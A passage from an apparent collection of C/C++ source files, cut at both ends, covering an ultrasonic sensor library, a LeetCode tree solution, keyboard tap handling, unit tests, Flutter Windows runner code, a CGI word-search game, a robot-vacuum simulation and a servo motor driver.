rounding).\n#else\n\treturn NewPingConvert(echoTime, US_ROUNDTRIP_IN); // Convert uS to inches.\n#endif\n}\n\n\nunsigned long NewPing::ping_median(uint8_t it, unsigned int max_cm_distance) {\n\tunsigned int uS[it], last;\n\tuint8_t j, i = 0;\n\tunsigned long t;\n\tuS[0] = NO_ECHO;\n\n\tif (max_cm_distance > 0) set_max_distance(max_cm_distance); // Call function to set a new max sensor distance.\n\n\twhile (i < it) {\n\t\tt = micros();          // Start ping timestamp.\n\t\tlast = ping();         // Send ping.\n\n\t\tif (last != NO_ECHO) { // Ping in range, include as part of median.\n\t\t\tif (i > 0) {       // Don't start sort till second ping.\n\t\t\t\tfor (j = i; j > 0 && uS[j - 1] < last; j--) // Insertion sort loop.\n\t\t\t\t\tuS[j] = uS[j - 1];                      // Shift ping array to correct position for sort insertion.\n\t\t\t} else j = 0;      // First ping is s",
    "//! Leetcode Question 110. Balanced Binary Tree\r\n\r\n//? link: https://leetcode.com/problems/balanced-binary-tree/description/\r\n\r\n#include<bits/stdc++.h>\r\nusing namespace std;\r\nstruct TreeNode {\r\n    int val;\r\n    TreeNode* left;\r\n    TreeNode* right;\r\n    TreeNode(int x) : val(x), left(NULL), right(NULL) {}\r\n};\r\nclass Soltuion{\r\n    public:\r\n    bool isBalanced(TreeNode* root){\r\n        if(root==NULL) return true;\r\n        if(height(root)==-1) return false;\r\n        return true;\r\n    }\r\n    int height(TreeNode* root){\r\n        if(root==NULL) return 0;\r\n        int left=height(root->left);\r\n        int right=height(root->right);\r\n        if(left==-1 || right==-1) return -1;\r\n        if(abs(left-right)>1) return -1;\r\n        return max(left,right)+1;\r\n    }\r\n};\r\nint main(){\r\n    TreeNode* root=new TreeNode(1);\r\n    root->left=new TreeNode(2);\r\n    root->right=new TreeNode(3);\r\n    root->left->left=new TreeNode(4);\r\n    root->left->right=new TreeNode(5);\r\n    Soltuion s;\r\n    cout<<s.isBalanced(root)<<endl;\r\n    return 0;\r\n}",
    "/*\n*  TapDance.cpp\n*\n*  MIT License\n*\n*  Copyright (c) 2024 Shubham Patel\n*\n*  Permission is hereby granted, free of charge, to any person obtaining a copy\n*  of this software and associated documentation files (the \"Software\"), to deal\n*  in the Software without restriction, including without limitation the rights\n*  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n*  copies of the Software, and to permit persons to whom the Software is\n*  furnished to do so, subject to the following conditions:\n*\n*  The above copyright notice and this permission notice shall be included in all\n*  copies or substantial portions of the Software.\n*\n*  THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n*  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n*  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n*  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n*  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n*  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n*  SOFTWARE.\n*/\n\n#include \"TapDance.h\"\n\nTapDance::TapDance() {}\n\nvoid TapDance::keyPressed(int keyIndex) {\n  keyState = &keyStates[keyIndex];\n\n  keyState->pressed = true;\n  keyState->lastClickedMs = millis();\n  keyState->singleClickCounter += 1;\n}\n\nvoid TapDance::keyReleased(int keyIndex) {\n  keyState = &keyStates[keyIndex];\n\n  keyState->pressed = false;\n  keyState->lastClickedMs = millis();\n  if (keyState->longPressed) {\n    keyState->longPressed = false;\n  }\n}\n\nvoid TapDance::tick() {\n  if (eventHandler == NULL || keyState == nullptr) {\n    return;\n  }\n\n  for (int key = 0; key < totalKeys; key++) {\n    keyState = &keyStates[key];\n    unsigned long duration = millis() - keyState->lastClickedMs;\n\n    if (keyState->singleClickCounter > 0 && !keyState->pressed && duration >= SinglePressDuration) {\n      if (keyState->singleClickCounter == 1) eventHandler(key, SINGLE_PRESS);       // Single\n      else if (keyState->singleClickCounter == 2) eventHandler(key, DOUBLE_PRESS);  // Double\n\n      keyState->singleClickCounter = 0;\n    } else if (!keyState->longPressed && keyState->pressed && duration >= LongPressDuration) {\n      eventHandler(key, LONG_PRESS);  // Long Press\n\n      keyState->longPressed = true;\n      keyState->singleClickCounter = 0;\n    }\n  }\n}",
    "// Copyright(c) 2024 grrimgrriefer & DZnnah, see LICENSE for details.\n\n#include \"pch.h\"\n#include \"CppUnitTest.h\"\n#include \"../TalkToMeCPP/src/Voxta/DataTypes/ServerResponses/ServerResponseCharacterLoaded.h\"\n#include \"../TalkToMeCPP/src/Voxta/DataTypes/ServerResponses/ServerResponseBase.h\"\n#include <string>\n\nusing namespace Microsoft::VisualStudio::CppUnitTestFramework;\n\nnamespace TalkToMeCPPTests\n{\n\tTEST_CLASS(ServerResponseCharacterLoadedTests)\n\t{\n\tpublic:\n\t\tTEST_METHOD(TestServerResponseCharacterLoadedGetType)\n\t\t{\n\t\t\tVoxta::DataTypes::ServerResponses::ServerResponseCharacterLoaded characterLoadedResponse(\"char001\", true);\n\t\t\tAssert::IsTrue(Voxta::DataTypes::ServerResponses::ServerResponseType::CHARACTER_LOADED == characterLoadedResponse.GetType());\n\t\t}\n\n\t\tTEST_METHOD(TestServerResponseCharacterLoadedCharacterId)\n\t\t{\n\t\t\tstd::string characterId = \"char001\";\n\t\t\tVoxta::DataTypes::ServerResponses::ServerResponseCharacterLoaded characterLoadedResponse(characterId, true);\n\t\t\tAssert::AreEqual(characterId, characterLoadedResponse.m_characterId);\n\t\t}\n\n\t\tTEST_METHOD(TestServerResponseCharacterLoadedEnableThinkingSpeech)\n\t\t{\n\t\t\tbool enableThinkingSpeech = true;\n\t\t\tVoxta::DataTypes::ServerResponses::ServerResponseCharacterLoaded characterLoadedResponse(\"char001\", enableThinkingSpeech);\n\t\t\tAssert::IsTrue(enableThinkingSpeech == characterLoadedResponse.m_enableThinkingSpeech);\n\t\t}\n\t};\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include <cstdlib>\n#include <string>\n#include <vector>\n#include <algorithm>\n#include <sstream>\n#include <ctime> // For randomization\n#include <cgicc/Cgicc.h>\n#include <cgicc/HTTPHTMLHeader.h>\n#include <cgicc/FormEntry.h>\n#include <cgicc/HTTPStatusHeader.h>\n\nusing namespace cgicc;\nstd::string trim(const std::string& str) {\n    size_t start = str.find_first_not_of(\" \\t\\n\\r\");\n    size_t end = str.find_last_not_of(\" \\t\\n\\r\");\n    return (start == std::string::npos || end == std::string::npos) ? \"\" : str.substr(start, end - start + 1);\n}\n\nstd::vector<std::string> generateRandomGrid(int rows, int cols) {\n    std::vector<std::string> grid(rows);\n    std::srand(std::time(0)); // Seed for random generation\n\n    for (int i = 0; i < rows; ++i) {\n        std::string row;\n        for (int j = 0; j < cols; ++j) {\n            char randomLetter = 'A' + (std::rand() % 26); // Random letter from A-Z\n            row += randomLetter;\n        }\n        grid[i] = row;\n    }\n\n    return grid;\n}\n\nint countWordInGrid(const std::vector<std::string>& grid, const std::string& word) {\n    int count = 0;\n    std::string upperWord = word;\n    std::transform(upperWord.begin(), upperWord.end(), upperWord.begin(), ::toupper);\n\n    for (const auto& row : grid) {\n        std::string upperRow = row;\n        std::transform(upperRow.begin(), upperRow.end(), upperRow.begin(), ::toupper);\n        for (size_t i = 0; i <= upperRow.length() - upperWord.length(); i++) {\n            if (upperRow.substr(i, upperWord.length()) == upperWord) {\n                count++;\n            }\n        }\n    }\n\n    for (size_t col = 0; col < grid[0].length(); col++) {\n        for (size_t row = 0; row <= grid.size() - upperWord.length(); row++) {\n            std::string verticalSegment;\n            for (size_t k = 0; k < upperWord.length(); k++) {\n                verticalSegment += grid[row + k][col];\n            }\n            std::transform(verticalSegment.begin(), verticalSegment.end(), verticalSegment.begin(), ::toupper);\n            if (verticalSegment == upperWord) {\n                count++;\n            }\n        }\n    }\n\n    return count;\n}\n\nint main() {\n    try {\n        Cgicc cgi;\n        std::cout << HTTPHTMLHeader() << std::endl;\n\n        std::string gridType = cgi(\"gridType\");\n        std::string searchWord = trim(cgi(\"searchWord\"));\n\n        std::vector<std::string> grid;\n\n        if (gridType == \"generate\") {\n            int rows = std::stoi(cgi(\"rows\"));\n            int cols = std::stoi(cgi(\"columns\"));\n\n            grid = generateRandomGrid(rows, cols);\n        } else {\n            const_file_iterator file = cgi.getFile(\"gridFile\");\n            if (file != cgi.getFiles().end()) {\n                std::istringstream stream((*file).getData());\n                std::string line;\n                while (std::getline(stream, line)) {\n                    if (!line.empty()) {\n                        grid.push_back(line);\n                    }\n                }\n            }\n        }\n\n        int wordCount = countWordInGrid(grid, searchWord);\n\n        std::cout << \"<html lang=\\\"en\\\">\\n\";\n        std::cout << \"<head>\\n\";\n        std::cout << \"<title>Pattern Match Game Result</title>\\n\";\n        std::cout << \"<style>\\n\";\n        std::cout << \"body { font-family: Arial, sans-serif; background: #f5f5f5; color: #333; text-align: center; }\\n\";\n        std::cout << \".container { max-width: 600px; margin: 20px auto; padding: 20px; background-color white; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); }\\n\";\n        std::cout << \".content { padding: 20px; text-align: center; }\\n\";\n        std::cout << \"pre { background: #f0f0f0; border: 1px solid #ddd; padding: 10px; border-radius: 5px; font-size: 1.25em; }\\n\"; \n        std::cout << \"</style>\\n\";\n        std::cout << \"</head>\\n\";\n        std::cout << \"<body>\\n\";\n        std::cout << \"<div class='container'>\\n\";\n        std::cout << \"<h1>Pattern Match Game Result</h1>\\n\";\n        std::cout << \"<div class='content'>\\n\";\n        std::cout << \"<pre>\\n\";\n        for (const auto& row : grid) {\n            std::cout << row << \"\\n\";\n        }\n        std::cout << \"</pre>\\n\";\n        std::cout << \"<p>Occurrences of the word '\" << searchWord << \"': \" << wordCount << \"</p>\\n\";\n        std::cout << \"</div>\\n\";\n        std::cout << \"</div>\\n\";\n        std::cout << \"</body>\\n\";\n        std::cout << \"</html>\\n\";\n    } catch (const std::exception& e) {\n        std::cout << \"Content-Type: text/plain\\n\\n\";\n        std::cout << \"Error: \" << e.what() << std::endl;\n    }\n\n    return 0;\n}\n\n",
    "#include <iostream>\r\n#include <fstream>\r\n#include <vector>\r\n#include <iomanip> \r\nusing namespace std;\r\n\r\nclass Robot {\r\nprotected:\r\n    int batteryLife;\r\n    int* cleaningArea;\r\n    int* cleaningTime;\r\n    int hiz[2];\r\n\r\npublic:\r\n    virtual void move(int hedefX, int hedefY) = 0;\r\n    Robot() {\r\n        \r\n        hiz[0] = 0;\r\n        hiz[1] = 1;\r\n        cleaningArea = new int;\r\n\t\tbatteryLife = 100;\r\n        cleaningTime = new int;\r\n    }\r\n\r\n    virtual ~Robot() {\r\n        delete cleaningArea;\r\n        delete cleaningTime;\r\n    }\r\n};\r\n\r\nclass RobotSweeper : protected Robot {\r\nprivate:\r\n\t\tint *currentX;\r\n\t\tint *currentY;\r\n\t\tint *currentBatteryLife;\r\n\t\tint *x2;\r\n\t\tint *y2;\r\n\t\tint *paspas_suyu;\t\r\n\r\npublic:\r\n    RobotSweeper() : currentX(new int(0)), currentY(new int(0)), currentBatteryLife(new int(100)), paspas_suyu(new int(0)), x2(new int(0)), y2(new int(0)) { }\r\n    ~RobotSweeper() {\r\n        delete currentX;\r\n        delete currentY;\r\n        delete currentBatteryLife;\r\n        delete x2;\r\n        delete y2;\r\n        delete paspas_suyu;\r\n    }\r\n  \tint &cleaningtime_getir(){\r\n\t\treturn *cleaningTime;\r\n\t\t}\r\n\tint &batterylife_getir(){\r\n\t\treturn *currentBatteryLife;\r\n\t\t}\r\n\r\n\tvoid vacuum(){\r\n\t\t\tif (*currentBatteryLife <= 5) {\r\n              \trobotu_sarj_etme();}\r\n            else{\r\n\t\t\t}\r\n\t\t\t}\t\r\n\t\t\t\r\n\tvoid mop() {\r\n    \tif (*paspas_suyu > 0 && *currentBatteryLife > 5) {\r\n        \tif (hiz[0] == 1) {\r\n            \t*currentBatteryLife = (*currentBatteryLife) - (*currentBatteryLife * 0.02);\r\n\t\t\t\t*paspas_suyu -= 1;}\r\n\t\t\t\t\r\n            else {\r\n            \t*currentBatteryLife = (*currentBatteryLife )- (*currentBatteryLife * 0.03);\r\n\t\t\t\t*paspas_suyu -= 1;}\r\n        }\r\n        else{\r\n\t        robotu_sarj_etme();\r\n\t\t\t}\r\n    }\r\n\r\n\tvoid sarj_istasyonuna_gitme() {\r\n    \t*x2 = *currentX;\r\n    \t*y2 = *currentY;\r\n    \t*currentX = 0;\r\n    \t*currentY = 0;\r\n\t\t}\r\n\tvoid robotu_sarj_etme(){\r\n\t\tsarj_istasyonuna_gitme();\r\n\t\t*currentBatteryLife = 100;\r\n\t\t*cleaningTime +=10;\r\n\t\t(*currentX) = (*x2)  ; \r\n    \t(*currentY) =(*y2) ; \r\n\t}\r\n\r\n\t\r\n\tRobotSweeper& operator=(const RobotSweeper& n) {\r\n   \t\t\t*y2 = *n.y2;\r\n   \t\t\t*x2 = *n.x2;\r\n   \t\t\t*cleaningTime = *n.cleaningTime;\r\n   \t\t\t*paspas_suyu = *n.paspas_suyu;\r\n        \t*currentBatteryLife = *n.currentBatteryLife;\r\n        \t*currentX = *n.currentX;\r\n        \t*currentY = *n.currentY;\r\n     \t\treturn *this;\r\n   }\r\n    void move(int x,int y) override {\r\n\t\tif(*currentBatteryLife <= 5){\r\n\t\t\tcout << \"Hareket icin yeterli enerji yok\" << endl;\r\n\t\t\trobotu_sarj_etme();\r\n\t\t\t}\r\n\t\tint x_mesafe = x - (*currentX);\r\n\t\tint y_mesafe = y - (*currentY);\r\n\t\tif(x_mesafe>0 || y_mesafe > 0) {\r\n\t\t\t(*currentY) += 1;\r\n\t\t}\r\n\t\tif(x_mesafe<0 || currentY < 0) {\r\n\t\t\t(*currentY) += 1;\r\n\t\t}\r\n    \tif (x_mesafe < 0) {\r\n        \t(*currentX) -= 1;\r\n    \t}\r\n    \tif (x_mesafe > 0) {\r\n        (*currentX) += 1;\r\n    \t}\r\n    \tif (currentY < 0) {\r\n        \t(*currentY) -= 1;\r\n    \t}\r\n    \tif (currentY > 0) {\r\n        \t(*currentY) += 1;\r\n    \t}\r\n\r\n\t\tif (hiz[0] == 1) {\r\n        \t*currentBatteryLife = (*currentBatteryLife) - (*currentBatteryLife * 0.01);\r\n        \t*cleaningTime += 2;}\t\t\r\n    \telse {\r\n        \t*currentBatteryLife = (*currentBatteryLife) - (*currentBatteryLife * 0.02);\r\n\t\t\t*cleaningTime += 1;\r\n\t\t\t}\r\n\t\t\t}\r\n\r\n};\r\nclass House{\r\n\tpublic:\r\n\t\tint x;\r\n\t\tint y;\r\n\t\tHouse() : x(0), y(0) {}\r\n\t\t\r\n};\r\nclass Room:public House{\r\npublic:\r\n\tint x1;\r\n\tint y1;\r\n\tint obstacleX;\r\n\tint obstacleY;\r\n\tRoom() : x1(0), y1(0),obstacleX(0),obstacleY(0){}\r\n\tint getRoom() const {\r\n        cout << \"Oda Bilgisi:\" << endl;\r\n        cout << \"Kordinatlar: (\" << x1 << \", \" << y1 << \")\" << std::endl;\r\n        cout << \"Engel Kordinatlari: (\" << obstacleX << \", \" << obstacleY << \")\" << std::endl;\r\n        return x1 + y1 + obstacleX + obstacleY;\r\n    }\r\n};\r\nclass Area:public House{\r\npublic:\r\n\tint edgeX;\r\n\tint edgeY;\r\n\tArea() : edgeX(0), edgeY(0){}\r\n\tint getArea() const {\r\n        std::cout << \"Konum Bilgisi:\" << std::endl;\r\n        std::cout << \"Engel Kordinatlari: (\" << edgeX << \", \" << edgeY << \")\" << std::endl;\r\n        return edgeX * edgeY;\r\n    }\r\n};\r\nvoid harita_dosyasi_okuma(const std::string& dosyaadi, std::vector<Room>& odalar, std::vector<std::pair<int, int>>& engel) {\r\n    ifstream inputFile(dosyaadi);\r\n    string obje_turu;\r\n    if (!inputFile) {\r\n        cerr << \"Dosya acilamadi !!\" << endl;\r\n        exit(EXIT_FAILURE);\r\n    }\r\n\r\n    while (inputFile >> obje_turu) {\r\n        if (obje_turu == \"Room\") {\r\n            Room oda;\r\n            inputFile >> oda.x1 >> oda.y1 >> oda.obstacleX >> oda.obstacleY;\r\n            odalar.push_back(oda);\r\n        } else if (obje_turu == \"Obstacle\") {\r\n            int engel_x;\r\n\t\t\tint engel_y;\r\n            inputFile >> engel_x >> engel_y;\r\n            engel.emplace_back(engel_x, engel_y);\r\n        }\r\n    }\r\n\r\n    inputFile.close();\r\n}\r\n\r\n\r\nvoid cleanArea(RobotSweeper& robot, int ilk_x, int ilk_y, int son_x, int son_y, const vector<pair<int, int>>& engeller) {\r\n    int& cleaningTime = robot.cleaningtime_getir();\r\n    int& batt",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"classes\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"MksServo42c.h\"\r\n\r\nMKSServoDriver::MKSServoDriver() \r\n{\r\n  servoSerial = nullptr;\r\n}\r\n\r\nvoid MKSServoDriver::init(uint8_t RX, uint8_t TX, long const baudRate, uint8_t servoAddress) \r\n{\r\n    servoSerial = new EspSoftwareSerial::UART(RX, TX);\r\n    servoSerial->begin(baudRate);\r\n    rxCnt=0;\r\n    MStep = 0x08;\r\n    stepSize = 1.8;\r\n    servoAddress = 0xE0 + servoAddress;\r\n    txBuffer[0] = servoAddress;\r\n}\r\n\r\nfloat MKSServoDriver::sendServoSignal(command order)\r\n{\r\n  length = 3;\r\n  if(order == readEncoder){\r\n    txBuffer[1] = 0x30;\r\n    length = 8;\r\n  }\r\n  else if(order == readPulses){\r\n    txBuffer[1] = 0x33;\r\n    length = 6;\r\n  }\r\n  else if(order == readAngle){\r\n    txBuffer[1] = 0x36;\r\n    length =  6;\r\n  }\r\n  else if(order == readErrorAngle){\r\n    txBuffer[1] = 0x39;\r\n    length = 4;\r\n  }\r\n  else if(order == readEnableStatus){\r\n    txBuffer[1] = 0x3a;\r\n  }\r\n  else if(order == readShaftStatus){\r\n    txBuffer[1] = 0x3e;\r\n  }\r\n  else {\r\n    error();\r\n    return 0;\r\n  }\r\n  txBuffer[2] = getCheckSum(txBuffer,2);\r\n  servoSerial->write(txBuffer,3);\r\n  ack(length,order);\r\n  if(order!=readEnableStatus || order!=readShaftStatus)\r\n    return modValue;\r\n  return 0;\r\n}\r\nvoid MKSServoDriver::sendServoSignal(command order, uint8_t mode)\r\n{\r\n  length = 4;\r\n  if(order == sendCalibrate){\r\n    txBuffer[1] = 0x80;\r\n  }\r\n  else if(order == sendMotorType){\r\n    txBuffer[1] = 0x81;\r\n    stepSize = (mode*0.9) + 0.9;\r\n    MKSServoDriver::setConstants();\r\n  }\r\n  else if(order == sendControlMode){\r\n    txBuffer[1] = 0x82;\r\n  }\r\n  else if(order == sendOperatingCurrent){\r\n    txBuffer[1] = 0x83;\r\n  }\r\n  else if(order == sendStepSize){\r\n    txBuffer[1] = 0x84;\r\n    MStep = mode;\r\n    MKSServoDriver::setConstants();\r\n  }\r\n  else if(order == sendEnableType){\r\n    txBuffer[1] = 0x85;\r\n  }\r\n  else if(order == sendMotorDirection){\r\n    txBuffer[1] = 0x86;\r\n  }\r\n  else if(order == sendAutoScreenOff){\r\n    txBuffer[1] = 0x87;\r\n  }\r\n  else if(order == sendStallProtection){\r\n    txBuffer[1] = 0x88;\r\n  }\r\n  else if(order == sendInternalSubdivision){\r\n    txBuffer[1] = 0x89;\r\n  }\r\n  else if(order == sendUartBaud){\r\n    txBuffer[1] = 0x8a;\r\n  }\r\n  else if(order == sendUartAddress){\r\n    txBuffer[1] = 0x8b;\r\n  }\r\n  else if(order == sendZeroMode){\r\n    txBuffer[1] = 0x90;\r\n  }\r\n  else if(order == sendZeroPoint){\r\n    txBuffer[1] = 0x91;\r\n  }\r\n  else if(order == sendZeroSpeed){\r\n    txBuffer[1] = 0x92;\r\n  }\r\n  else if(order == sendZeroDirection){\r\n    txBuffer[1] = 0x93;\r\n  }\r\n  else if(order == moveZeroPoint){\r\n    txBuffer[1] = 0x94;\r\n  }\r\n  else {\r\n    error();\r\n    return ;\r\n  }\r\n  txBuffer[2] = mode;\r\n  txBuffer[3] = getCheckSum(txBuffer,3);\r\n  if(order!=sendCalibrate)\r\n    servoSerial->write(txBuffer,4);\r\n  else\r\n  {\r\n    servoSerial->write(txBuffer,4);\r\n    delay(50000);\r\n  }\r\n  length = 3;\r\n  ack(length,order);\r\n}\r\n\r\n//Default values: Kp:0x650, Ki:0x1, Kd: 0x650, Acc: 0x11e, MaxT: 0x4B0 (max)\r\nvoid MKSServoDriver::setParameters(command order, uint16_t param)\r\n{\r\n  if(order == setKp){\r\n    txBuffer[1] = 0xA1;\r\n  }\r\n  else if(order == setKi){\r\n    txBuffer[1] = 0xA2;\r\n  }\r\n  else if(order == setKd){\r\n    txBuffer[1] = 0xA3;\r\n  }\r\n  else if(order == setAcc){\r\n    txBuffer[1] = 0xA4;\r\n  }\r\n  else if(order == setMaxTo){\r\n    txBuffer[1] = 0xA5;\r\n    param = static_cast<uint16_t>(percentageToRange(param,0x0000,0x04B0));\r\n  }\r\n  else {\r\n    error();\r\n    return ;\r\n  }\r\n  txBuffer[2] = (param >> 8) & 0xFF;\r\n  txBuffer[3] = param & 0xFF;\r\n  txBuffer[4] = getCheckSum(txBuffer,4);\r\n  servoSerial->write(txBuffer,5);\r\n  ack(length,order);\r\n}\r\n\r\nvoid MKSServoDriver::constantControl(command order, float value, bool direction)\r\n{\r\n  length=4;\r\n  if(order == setEnable){\r\n    txBuffer[1] = 0xF3;\r\n  }\r\n  else if(order == runConstSpeed){\r\n    txBuffer[1] = 0xF6;\r\n    value = static_cast<uint8_t>((direction << 7) | percentageToRange(value, 0x00, 0x7F));\r\n  }\r\n  else if(order == stopMotor){\r\n    txBuffer[1] = 0xF7;\r\n    